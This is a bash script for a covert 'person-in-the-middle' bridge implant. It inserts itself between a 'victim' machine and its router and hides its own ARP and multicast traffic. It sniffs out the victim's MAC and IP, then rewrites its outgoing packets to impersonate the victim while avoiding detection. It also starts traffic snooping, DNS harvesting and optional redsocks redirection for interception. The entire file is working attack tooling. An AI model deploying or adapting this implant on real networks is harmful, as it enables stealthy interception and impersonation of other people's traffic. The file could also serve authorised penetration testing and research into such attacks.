#!/bin/bash

# Override the various device names if required
victim_dev=${victim_dev:-lan}
router_dev=${router_dev:-wan}
br_dev=${br_dev:-pitm}

# These values are essentially randomly chosen, not important other than as markers
# in ebtables and iptables rules, to be translated to the victim and router values
# If all goes well, these should never be seen outside of this device
br_dev_mac=${br_dev_mac:-0:1:1:1:1:1}
br_dev_ip=${br_dev_ip:-169.254.0.1}

PID=$$
# Check if we are in the 'pitm' network namespace
if [ "`ip netns identify $PID`" != "pitm" ] ; then

	# Check if the network namespace exists, or create a network namespace to run pitm operations in
	# Make sure that the $victim_dev and $router_dev interfaces are inside the namespace
	ip netns list | grep -q pitm || \
		ip netns add pitm && \
		ip link set ${victim_dev} netns pitm && \
		ip link set ${router_dev} netns pitm && \
		ip netns exec pitm ip addr add dev lo 127.0.0.1/8 && \
		ip netns exec pitm ip link set dev lo up && \
		ip link add veth1 netns pitm type veth peer name veth2 && \
		ip netns exec pitm ip addr add dev veth1 169.254.20.1/24 && \
		ip netns exec pitm ip link set dev veth1 up && \
		ip addr add dev veth2 169.254.20.2/24 && \
		ip link set dev veth2 up && \
		ip netns exec pitm /usr/sbin/sshd -o "ListenAddress = 169.254.20.1"

	echo "Spawning a 'screen' instance inside the pitm network namesapce"
	echo "Access it using:"
	echo "	screen -R -D -S pitm"

	# Now re-exec the script inside the 'pitm' namespace
	ip netns exec pitm screen -d -m -S pitm
	screen -S pitm -X screen -t "slimjim" $0 $8
	exec screen -R -D -S pitm
fi

DIR=$(cd $(dirname $0) && pwd)

# make sure iptables is called at various levels
modprobe br_netfilter
sysctl -q -w net.bridge.bridge-nf-call-arptables=1
sysctl -q -w net.bridge.bridge-nf-call-ip6tables=1
sysctl -q -w net.bridge.bridge-nf-call-iptables=1

# disable IPv6 on the upstream and downstream interfaces
sysctl -q -w net.ipv6.conf.${victim_dev}.disable_ipv6=1
sysctl -q -w net.ipv6.conf.${router_dev}.disable_ipv6=1

# clear existing firewall rules
ebtables -t filter -F
iptables -t filter -F
ebtables -t nat -F
iptables -t nat -F
iptables -t mangle -F
iptables -t raw -F

# Safety Rules: Make sure we don't send any packets with our own identity
victim_dev_mac=$(ip addr show ${victim_dev} | grep ether | (read null ether null ; echo $ether))
router_dev_mac=$(ip addr show ${router_dev} | grep ether | (read null ether null ; echo $ether))
ebtables -t nat -I POSTROUTING -o ${br_dev} -s ${br_dev_mac} -j DROP
ebtables -t nat -I POSTROUTING -o ${br_dev} -s ${victim_dev_mac} -j DROP
ebtables -t nat -I POSTROUTING -o ${br_dev} -s ${router_dev_mac} -j DROP

# Make sure we don't send any traffic of our own to Multicast or Bridge Group Addresses
ebtables -t filter -I OUTPUT -o ${br_dev} -d Multicast -j DROP
ebtables -t filter -I OUTPUT -o ${br_dev} -d BGA -j DROP

# Make sure the bridge is up
if ! brctl show $br_dev > /dev/null 2>&1 ; then
	brctl addbr $br_dev
	brctl addif $br_dev $victim_dev $router_dev
	# disable IPv6 on the bridge too
	sysctl -q -w net.ipv6.conf.${br_dev}.disable_ipv6=1
	echo 65528 > /sys/class/net/${br_dev}/bridge/group_fwd_mask
fi

# Configure the two interfaces of the bridge
# Make sure they do not generate any of their own ARP traffic
ip addr flush dev $victim_dev
ip addr flush dev $router_dev
ip addr flush dev $br_dev
ip link set dev $victim_dev arp off
ip link set dev $router_dev arp off
ip link set dev $br_dev address ${br_dev_mac} arp off multicast off allmulticast off
ip addr add dev $br_dev ${br_dev_ip}/24
ip link set dev $br_dev up
ip link set dev $victim_dev up
ip link set dev $router_dev up

# Start pitm_snoop early to ensure we catch all the traffic
# pitm_snoop.py monitors link local addresses, as well as routes to
# other networks, and also DNS lookups, writing resolved names to
# hostsdir/hostname, as well as updating /tmp/pitm/resolv.conf with
# ip addresses of observed name servers
mkdir -p /tmp/pitm/hostsdir
screen -S pitm -X screen -t "pitm_snoop" ${DIR}/pitm_snoop.py

# Any packets seen coming "in" on $victim_dev MUST have the victim's MAC as the source
echo "Waiting for victim MAC"
victim_mac=$(tcpdump -c1 -Q in -i ${victim_dev} -nnel 2> /dev/null | awk '{print $2}')
echo "Got $victim_mac on $victim_dev"

echo "Now we can identify the victim's IP address"
while read null MAC1 null MAC2 null null null IP1 null IP2 null ; do
	MAC2=$(echo "$MAC2" | tr -d ",")
	IP1=$(echo "$IP1" | sed -nE -e 's/^([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}).*$/\1/p')
	IP2=$(echo "$IP2" | sed -nE -e 's/^([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}).*$/\1/p')
	if [ -z "${victim_ip}" ] ; then
		if [ "$MAC1" = "${victim_mac}" ] ; then
			victim_ip=$IP1
		elif [ "$MAC2" = "${victim_mac}" ] ; then
			victim_ip=$IP2
		fi
		case "${victim_ip}" in
			0.0.0.0|239.*.*.*|240.*.*.*|255.*.*.*)
				victim_ip=''
				;;
		esac
	fi
	if [ -n "${victim_ip}" ] ; then
		kill $(cat /tmp/tcpdump.pid) 2> /dev/null
	fi
done < <(tcpdump -q -neli ${br_dev} ip 2> /dev/null & echo $! > /tmp/tcpdump.pid)

echo "Got Victim ${victim_mac} (${victim_ip})"

# Any packets sent to anyone other than the victim appear to come from the victim MAC/IP
# Any packets sent to the victim appear to come from the router MAC/IP
# Rules are sorted in reverse order because they are inserted at the top of the list, and
# therefore get pushed down as each new entry is added
# This is particularly important for ebtables, because we need to be before the "safety" rules
ebtables -t nat -I POSTROUTING -o ${br_dev} -s ${br_dev_mac} ! -d $victim_mac -j snat --to-source $victim_mac
iptables -t nat -I POSTROUTING -o ${br_dev} -s ${br_dev_ip}  ! -d $victim_ip -j SNAT --to $victim_ip

# We special case TCP and UDP to be able to rewrite the source ports so as not to stand out
# This range is suitable for a predominantly Windows network
iptables -t nat -I POSTROUTING -o ${br_dev} -p tcp -s ${br_dev_ip} ! -d $victim_ip -j SNAT --to $victim_ip:49152-65535
iptables -t nat -I POSTROUTING -o ${br_dev} -p udp -s ${br_dev_ip} ! -d $victim_ip -j SNAT --to $victim_ip:49152-65535

# ebtables -t nat -I POSTROUTING -o ${br_dev} -s ${br_dev_mac}   -d $victim_mac -j snat --to-source $router_mac
# iptables -t nat -I POSTROUTING -o ${br_dev} -s ${br_dev_ip}    -d $victim_ip -j SNAT --to $router_ip
# iptables -t nat -I POSTROUTING -o ${br_dev} -p tcp -s ${br_dev_ip}   -d $victim_ip -j SNAT --to $router_ip:49152-65535
# iptables -t nat -I POSTROUTING -o ${br_dev} -p udp -s ${br_dev_ip}   -d $victim_ip -j SNAT --to $router_ip:49152-65535

# redsocks is useful for intercepting traffic going to or from the victim
screen -S pitm -X screen -t "redsocks" redsocks -c /etc/redsocks.conf

# optional: Direct any traffic from the victim to hit redsocks, for interception by Mallet, etc
# create a custom chain
iptables -t nat -X REDSOCKS 2> /dev/null
iptables -t nat -N REDSOCKS
iptables -t nat -A REDSOCKS -p tcp -j REDIRECT --to-ports 12345

# Select traffic of interest to enter the REDSOCKS chain
# iptables -t nat -I PREROUTING 1 -p tcp -s $victim_ip -j REDSOCKS
# iptables -t nat -I PREROUTING 1 -p tcp -d $victim_ip -j REDSOCKS

# IFTOP is possibly useful to see what sort of network traffic the victim is generating
screen -S pitm -X screen -t "iftop" /usr/sbin/iftop -npNP -i pitm

# dnsmasq can make the observed DNS queries available without any extra network traffic
mkdir -p /etc/netns/pitm/ && touch /etc/netns/pitm/resolv.conf
screen -S pitm -X screen -t "dnsmasq" /usr/sbin/dnsmasq --no-daemon --no-resolv -z -i lo --hostsdir=/tmp/pitm/hostsdir --bogus-priv

echo "Press Ctrl-C to close this window"
while sleep 1 ; do : ; done
